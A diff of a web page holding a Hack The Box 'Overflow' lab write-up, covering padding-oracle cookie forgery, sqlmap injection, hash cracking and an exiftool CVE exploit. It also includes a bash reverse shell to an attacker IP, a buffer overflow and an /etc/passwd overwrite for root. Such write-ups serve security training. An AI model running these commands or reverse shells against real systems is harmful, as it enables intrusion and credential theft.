+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ padbuster http://overflow.htb/login.php &quot;8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; 8 -cookie &quot;auth=8NDZLZGXTnJiGPmz0uA2%2FOzd49I5waGo&quot; -encoding 0 -plaintext &quot;user=admin&quot;
 
 ...[snip]...
 
@@ -440,7 +440,7 @@ Block 2 Results:
 </doc-codeblock></div>
 <p>Great! We have the <code v-pre>admin</code> cookie! We can open the browser developer tools and change the current cookie to this one. As soon as we refresh the page we get an &quot;Admin Panel&quot; menu option:
 <figure class="content-center">
-    <img src="images/image6.png" alt="">
+    <img src="images/image6.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -453,18 +453,22 @@ Block 2 Results:
 </doc-anchor-target>
 <p>Decided to go back to <code v-pre>/home</code> and take a look at the &quot;Logs&quot;. Since we were not authorized before, lets see what happend with admin cookie:
 <figure class="content-center">
-    <img src="images/image7.png" alt="">
+    <img src="images/image7.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Clicking in the &quot;Logs&quot; menu bar opens a popup dialog displaying the last login times of the user. If we look in the browser developer tools, we can see an interesting JavaScript being loaded <code v-pre>../config/admin_last_login.js</code>. Lets take a look at it.
 <figure class="content-center">
-    <img src="images/image8.png" alt="">
+    <img src="images/image8.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Basically, it is fetching data from <code v-pre>http://overflow.htb/home/logs.php?name=admin</code>. Going to that URL we can confirm that:
-![[image9.png]]</p>
+<figure class="content-center">
+    <img src="../../challenges/find-the-easy-pass/images/image9.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Every time a web application have a parameter that the user can control, we should test for weak sanitization. I will make this request again, intercept with Burp, save it to a file and use sqlmap to check for injections.</p>
 <doc-anchor-target id="sqlmap">
     <h3>
@@ -474,7 +478,7 @@ Block 2 Results:
 </doc-anchor-target>
 <p>Request saved from Burp (important to keep the cookie for authentication!):</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">GET /home/logs.php?name=admin HTTP/1.1
+<pre translate="no" class="language-none"><code v-pre class="language-none">GET /home/logs.php?name=admin HTTP/1.1
 Host: overflow.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -486,7 +490,7 @@ Upgrade-Insecure-Requests: 1</code></pre>
 </doc-codeblock></div>
 <p>Testing for SQL injections:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ sqlmap -r logs.req --batch
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ sqlmap -r logs.req --batch
                                                      
        __H__                                                                                                                                           
  ___ ___[)]_____ ___ ___  {1.6.3#stable}                                                                                                               
@@ -524,7 +528,7 @@ back-end DBMS: MySQL &gt;= 5.0.12</code></pre>
 <p>Yes! It is vulnerable to SQL injection. We see that the database is MySQL so we can add <code v-pre>-dbms=mysql</code> to our next queries. Lets enumerate this databases.</p>
 <p>Databases:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql --dbs
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql --dbs
 
 [09:48:37] [INFO] fetching database names
 available databases [4]:
@@ -535,7 +539,7 @@ available databases [4]:
 </doc-codeblock></div>
 <p>DB-&gt;Overflow:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D Overflow --tables --dump
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D Overflow --tables --dump
 
 Database: Overflow
 Table: users
@@ -549,7 +553,7 @@ Table: users
 <p>I could not crack this password! Lets move on.</p>
 <p>DB-&gt;cmsmsdb:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb --tables
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb --tables
 
 Database: cmsmsdb                                                                                                                              [10/581]
 [47 tables]                                                                                                                                            
@@ -605,7 +609,7 @@ Database: cmsmsdb                                                               
 </doc-codeblock></div>
 <p>DB-&gt;cmsmsdb Table-&gt;cms_users:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_users -C username,password,email --dump
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_users -C username,password,email --dump
 
 Database: cmsmsdb
 Table: cms_users
@@ -620,7 +624,7 @@ Table: cms_users
 <p>Ok, this looks promising...
 Doing a little bit of research, this hashes are encrypted with salt and it can be found in the <code v-pre>cms_siteprefs</code> table under the <code v-pre>sitemask</code> column:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_siteprefs
+<pre translate="no" class="language-none"><code v-pre class="language-none">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_siteprefs
 
 ...[snip]...
 
@@ -636,12 +640,12 @@ Doing a little bit of research, this hashes are encrypted with salt and it can b
 </doc-anchor-target>
 <p>In order to use hashcat we need to add the hashes into a file following th <code v-pre>hash:salt</code> format:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">c6c6b9310e0e6f3eb3ffeb2baff12fdd:6c2d17f37e226486
+<pre translate="no" class="language-none"><code v-pre class="language-none">c6c6b9310e0e6f3eb3ffeb2baff12fdd:6c2d17f37e226486
 e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486</code></pre>
 </doc-codeblock></div>
 <p>Lets run hashcat against the hashes:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
+<pre translate="no" class="language-none"><code v-pre class="language-none">hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
 
 e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo</code></pre>
 </doc-codeblock></div>
@@ -655,7 +659,7 @@ e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo</code></pre>
 <p>Back to the CMS page <a href="http://overflow.htb/admin_cms_panel/admin/login.php">http://overflow.htb/admin_cms_panel/admin/login.php</a> we can use this credentials to login!
 We can see at the bottom of the page the version <code v-pre>CMS Made Simple 2.2.8 Flin Flon</code>. I kept browsing and enumerating the pages and saw an hint to another page:
 <figure class="content-center">
-    <img src="images/image10.png" alt="">
+    <img src="images/image10.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -669,13 +673,13 @@ There is a login page and using the same credentials from <code v-pre>editor</co
 </doc-anchor-target>
 <p>Poking around on the website, we find an upload function when we click on our account. I tried uploading a php webshell, but it failed due to unsupported filetype.
 <figure class="content-center">
-    <img src="images/image11.png" alt="">
+    <img src="images/image11.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Another interesting thing was the server response when we upload a file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">HTTP/1.1 302 Moved Temporarily
+<pre translate="no" class="language-none"><code v-pre class="language-none">HTTP/1.1 302 Moved Temporarily
 Date: Tue, 22 Mar 2022 02:40:21 GMT
 Server: Apache/2.4.29 (Ubuntu)
 Location: ./index.php?upload=0
@@ -699,7 +703,7 @@ MIME Type                       : image/jpeg
 </doc-codeblock></div>
 <p>It is using exiftool! Doing a little more research on <em>exiftool</em> - specially version 11.92, I found a <a href="https://www.exploit-db.com/download/49881">CVE-2021–22204</a>. Metasploit has a module for the exploit, which makes this super convenient.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">msf6 &gt; use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
+<pre translate="no" class="language-none"><code v-pre class="language-none">msf6 &gt; use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; set LHOST 10.10.14.3
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; options
 
@@ -732,7 +736,7 @@ msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; run
 </doc-codeblock></div>
 <p>Lets start a netcat listener on port 4444 and upload the generated jpeg file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">nc -lnvp 4444
+<pre translate="no" class="language-none"><code v-pre class="language-none">nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.11.119] 38406
 
@@ -753,7 +757,7 @@ www-data@overflow:~/devbuild-job/home/profile$</code></pre>
 <p>Looking through the web folders we find some credentials.
 <code v-pre>~/devbuild-job/config/db.php</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/devbuild-job/config$ cat db.php 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/devbuild-job/config$ cat db.php 
 &lt;?php
 $lnk = mysqli_connect(&quot;localhost&quot;,&quot;dev_manager&quot;, &quot;3RyxKah_hBf*V6ja&quot;,&quot;develop&quot;);
 ?&gt;</code></pre>
@@ -761,7 +765,7 @@ $lnk = mysqli_connect(&quot;localhost&quot;,&quot;dev_manager&quot;, &quot;3RyxK
 <p>And</p>
 <p><code v-pre>~/html/config/db.php</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/html/config$ cat db.php 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/html/config$ cat db.php 
 &lt;?php 
 
 #define('DB_Server', 'localhost');
@@ -781,7 +785,7 @@ if($db == false){
 </doc-codeblock></div>
 <p>We need to escalate to a user, preferable with shell. Lets look at the <code v-pre>/etc/passwd</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">www-data@overflow:~/devbuild-job/config$ cat /etc/passwd | grep &quot;sh$&quot;
+<pre translate="no" class="language-none"><code v-pre class="language-none">www-data@overflow:~/devbuild-job/config$ cat /etc/passwd | grep &quot;sh$&quot;
 root:x:0:0:root:/root:/bin/bash
 tester:x:1000:1000:tester,,,:/home/tester:/bin/bash
 developer:x:1001:1001::/home/developer:/bin/sh</code></pre>
@@ -794,7 +798,7 @@ developer:x:1001:1001::/home/developer:/bin/sh</code></pre>
     </h2>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ssh developer@overflow.htb
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ssh developer@overflow.htb
 developer@overflow.htbs password: 
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-159-generic x86_64)
 
@@ -833,7 +837,7 @@ drwx------ 2 developer developer 4096 Sep 28 04:44 .ssh
 <p>We still don&#x27;t have <code v-pre>user.txt</code> flag! It is in the <code v-pre>/home/tester</code> directory. So we need to find a way to escalate to <code v-pre>tester</code> user.</p>
 <p>Enumerating the machine, we see some interesting files owned by <code v-pre>tester</code> in <code v-pre>/opt</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">developer@overflow:/opt$ ls -la
+<pre translate="no" class="language-none"><code v-pre class="language-none">developer@overflow:/opt$ ls -la
 total 16
 drwxr-xr-x   3 root   root   4096 Sep 17  2021 .
 drwxr-xr-x  25 root   root   4096 Jan 26 21:08 ..
@@ -856,7 +860,7 @@ bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)</code></pre>
 </ul>
 <p>First I created the <code v-pre>task.sh</code> in my machine with a bash reverse shell and started a Python web server on port 80:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ cat task.sh                                                                               
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ cat task.sh                                                                               
 bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1
 
 $ sudo python3 -m http.server 80
@@ -865,7 +869,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
 <p>Also in another terminal started a netcat listener on port 4444.</p>
 <p>In Overflow machine we can add the host entry <code v-pre>taskmanage.overflow.htb</code> pointing to our machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">echo &quot;10.10.14.3 taskmanage.overflow.htb&quot; &gt;&gt; /etc/hosts</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">echo &quot;10.10.14.3 taskmanage.overflow.htb&quot; &gt;&gt; /etc/hosts</code></pre>
 </doc-codeblock></div>
 <p>After a minute or two we get a hit in our Python web server and a connection back to our netcat listener!</p>
 <doc-anchor-target id="shell-as-tester">
@@ -875,7 +879,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
     </h2>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ nc -lnvp 4444
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.11.119] 38718
 bash: cannot set terminal process group (6059): Inappropriate ioctl for device
@@ -884,7 +888,7 @@ tester@overflow:~$</code></pre>
 </doc-codeblock></div>
 <p>Lets upgrade the tty generating SSH keys:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">tester@overflow:~/.ssh$ ssh-keygen
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">tester@overflow:~/.ssh$ ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/tester/.ssh/id_rsa): 
 Enter passphrase (empty for no passphrase): 
@@ -898,7 +902,7 @@ tester@overflow:~/.ssh$ cat id_rsa</code></pre>
 </doc-codeblock></div>
 <p>Create a file with the <code v-pre>id_rsa</code> contents in attacker machine and use it to SSH in:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ nano tester.idrsa
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nano tester.idrsa
 $ chmod 600 tester.idrsa
 $ ssh -i tester.idrsa tester@overflow.htb</code></pre>
 </doc-codeblock></div>
@@ -910,7 +914,7 @@ $ ssh -i tester.idrsa tester@overflow.htb</code></pre>
 </doc-anchor-target>
 <p>Going back to the <code v-pre>/opt</code> directory we can access the <code v-pre>file_encrypt</code> folder, owned by root but with ACLS to the <code v-pre>tester</code> user, and read the <code v-pre>README.md</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ cat README.md 
+<pre translate="no" class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ cat README.md 
 Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox
 
 tester@overflow:/opt/file_encrypt$ ./file_encrypt 
@@ -919,12 +923,12 @@ Wrong Pin</code></pre>
 </doc-codeblock></div>
 <p>Given the name of the machine, I thought this would be a buffer overflow. So I tried passing varying lengths and characters to the PIN field but just said &quot;Wrong Pin&quot;. So, let’s bring the file back to our machine so we can reverse it.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">scp -i tester.idrsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">scp -i tester.idrsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt
 file_encrypt                                            100%   12KB  37.4KB/s   00:00</code></pre>
 </doc-codeblock></div>
 <p>First I check the file security flags:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ checksec file_encrypt 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ checksec file_encrypt 
 [*] '/home/caue/htb/overflow/reverse/file_encrypt'
     Arch:     i386-32-little
     RELRO:    Full RELRO
@@ -935,7 +939,7 @@ file_encrypt                                            100%   12KB  37.4KB/s   
 <p>Lets open in Ghidra and have a look at the functions!
 Starting with the <code v-pre>check_pin</code> function, maybe we can reverse the code to determine a valid PIN.
 <figure class="content-center">
-    <img src="images/image12.png" alt="">
+    <img src="images/image12.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -943,7 +947,7 @@ Starting with the <code v-pre>check_pin</code> function, maybe we can reverse th
 <code v-pre>local_14</code> is generated through the <code v-pre>random()</code> function. Let’s look at it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">random()</div>
-<pre class="language-c"><code v-pre class="language-c">long random(void)
+<pre translate="no" class="language-c"><code v-pre class="language-c">long random(void)
 
 {
   uint in_stack_00000004;
@@ -961,7 +965,7 @@ Starting with the <code v-pre>check_pin</code> function, maybe we can reverse th
 There are a few gotcha’s in this function. First, was not able to decompile the first variable correctly, leaving us with <code v-pre>in_stack_00000004</code>. We need to identify this value since we will be xor’ing it with the <code v-pre>local_c</code> value below.</p>
 <p>To get this value, we use gdb to set a breakpoint at the function <code v-pre>return</code>, and then we examine the value in memory at that location:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gdb file_encrypt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ gdb file_encrypt
 
 (gdb) disas random
 Dump of assembler code for function random:
@@ -988,12 +992,12 @@ End of assembler dump.</code></pre>
 </doc-codeblock></div>
 <p>Here we disassemble the <code v-pre>random()</code> function. Next we set a breakpoint at offset 57, where we xor our values. The end result of the xor operation is returned by the function.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">(gdb) b * random+57
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">(gdb) b * random+57
 Breakpoint 1 at 0x856</code></pre>
 </doc-codeblock></div>
 <p>Now we run the program until the breakpoint is reached. Once there, we can examine the value at the memory location, which would be <code v-pre>0x8(%ebp)</code> or, written differently, <code v-pre>ebp+8</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">(gdb) r
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">(gdb) r
 Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
 
 Breakpoint 1, 0x56555856 in random ()
@@ -1006,7 +1010,7 @@ Breakpoint 1, 0x56555856 in random ()
 <p>The other issue is that the return value from the random function is a type long integer. Because our input value in <code v-pre>check_pin</code> is a signed <code v-pre>int</code> type, we need to cast the return value from <code v-pre>random</code> as a signed <code v-pre>int</code>, otherwise the values will never match. Python3 does not differentiate between <code v-pre>long</code> and <code v-pre>int</code> values natively, so to do the conversion we need to include the <code v-pre>ctypes</code> import in our code.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">generate_pin.py</div>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
 
 import ctypes
 
@@ -1023,25 +1027,25 @@ print(&quot;The PIN code is: &quot;, PIN)</code></pre>
 </doc-codeblock></div>
 <p>Running the python script generates a PIN code:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 generate_pin.py
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 generate_pin.py
 The PIN code is:  -202976456</code></pre>
 </doc-codeblock></div>
 <p>And the PIN is valid! We’re presented with a name prompt and the program exited with a thank you message.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ ./file_encrypt 
+<pre translate="no" class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ ./file_encrypt 
 This is the code 1804289383. Enter the Pin: -202976456
 name: testing nameeeeee
 Thanks for checking. You can give your feedback for improvements at developer@overflow.htb</code></pre>
 </doc-codeblock></div>
 <p>Back to Ghidra we look at the <code v-pre>check_pin</code> function again and spot where the <code v-pre>name:</code> is being used and stored. It is stored in <code v-pre>local_2c</code> variable which is programmed to allocate 20 bytes only, here is our buffer overflow!
 <figure class="content-center">
-    <img src="images/image13.png" alt="">
+    <img src="images/image13.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We can confirm running the binary in gdb and passing a large amount of characters when it asks for a &quot;name&quot;:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ gdb file_encrypt
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ gdb file_encrypt
 
 (gdb) r
 Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
@@ -1054,12 +1058,12 @@ Program received signal SIGSEGV, Segmentation fault.
 </doc-codeblock></div>
 <p>The next step is to find the offset for the EIP register. If we’re able to control the values placed in the register, we can take control of the programs operational flow and redirect it to our advantage.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</code></pre>
 </doc-codeblock></div>
 <p>Using pattern_create, we generated a string of 300 characters. We’ll input it using gdb and then extract the EIP value.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">(gdb) r
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">(gdb) r
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
@@ -1073,17 +1077,17 @@ Program received signal SIGSEGV, Segmentation fault.
 <p>EIP was overwritten with <code v-pre>0x35624134</code>.
 Using <code v-pre>msf_pattern_offset</code> we can identify the overflow offset at 44.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ /usr/bin/msf-pattern_offset -l 300 -q 0x35624134
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ /usr/bin/msf-pattern_offset -l 300 -q 0x35624134
 [*] Exact match at offset 44</code></pre>
 </doc-codeblock></div>
 <p>Now that we know the offset, we’re going to attempt to route the program execution to the encrypt function. To get the address of the function, we run the program in gdb, issue a ctrl-c and dissassemble the function.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">(gdb) r                                                                                                                                                
+<pre translate="no" class="language-none"><code v-pre class="language-none">(gdb) r                                                                                                                                                
 The program being debugged has been started already.                                                                                                   
 Start it from the beginning? (y or n) y                                                                                                                
 Starting program: /home/caue/htb/overflow/reverse/file_encrypt                                                                                         
 This is the code 1804289383. Enter the Pin: -202976456                                                                                                 
-name: ^C                                                                                                                                               
+name: {#C}
 Program received signal SIGINT, Interrupt.                                                                                                             
 0xf7fc9559 in __kernel_vsyscall ()                                                                                                                     
 (gdb) disas encrypt                                                                                                                                    
@@ -1104,7 +1108,7 @@ Dump of assembler code for function encrypt:
 <p>The function starts at <code v-pre>0x5655585b</code>.
 Now we can add that to our buffer overflow to overwrite EIP and force us to the encrypt function.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python -c &quot;print('\x41' * 44 + '\x5b\x58\x55\x56')&quot;
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python -c &quot;print('\x41' * 44 + '\x5b\x58\x55\x56')&quot;
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
 
 (gdb) r
@@ -1122,19 +1126,19 @@ Going back into Ghidra, we take a closer look at the encrypt function. The progr
 <p>We will manually encrypt our modified passwd file first prior to passing it through the program. An encrypted value XOR’ed by the same key (0x9b) should give us the original cleartext <code v-pre>/etc/passwd</code>. In other words, the encryption program will actually decrypt our passwd file when it overwrites <code v-pre>/etc/passwd</code>.</p>
 <p>Create the new hash for user <code v-pre>caue</code> with password <code v-pre>pass123</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ openssl passwd -1 -salt caue pass123
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ openssl passwd -1 -salt caue pass123
 $1$caue$UbuBXypuA7ZQh9kxbERnQ/</code></pre>
 </doc-codeblock></div>
 <p>Make a copy of <code v-pre>/etc/passwd</code> and add our user with root privileges:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">tester@overflow:~$ cp /etc/passwd /tmp/passwd
+<pre translate="no" class="language-none"><code v-pre class="language-none">tester@overflow:~$ cp /etc/passwd /tmp/passwd
 tester@overflow:~$ echo 'caue:$1$caue$UbuBXypuA7ZQh9kxbERnQ/:0:0:root:/root:/bin/bash' &gt;&gt; /tmp/passwd
 </code></pre>
 </doc-codeblock></div>
 <p>Next we encrypt our modified <code v-pre>/tmp/passwd</code> file. To do this, I wrote a simple python script:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <div class="codeblock-title">encrypt_file.py</div>
-<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
+<pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
 
 source = open('/tmp/passwd', 'rb').read()  
 dest = open('/tmp/passwd2', 'wb')
@@ -1144,7 +1148,7 @@ dest.write(bytes([i ^ 0x9b]))</code></pre>
 </doc-codeblock></div>
 <p>Running the script give us a file called <code v-pre>passwd2</code> which is encrypted:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">tester@overflow:/tmp$ python3 encrypt_file.py</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">tester@overflow:/tmp$ python3 encrypt_file.py</code></pre>
 </doc-codeblock></div>
 <p>Now we’re ready to run the <code v-pre>file_encrypt</code> program with our overflow.</p>
 <doc-anchor-target id="root">
@@ -1154,7 +1158,7 @@ dest.write(bytes([i ^ 0x9b]))</code></pre>
     </h2>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/image14.png" alt="">
+    <img src="images/image14.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -1163,23 +1167,23 @@ dest.write(bytes([i ^ 0x9b]))</code></pre>
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/noter/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/noter/">
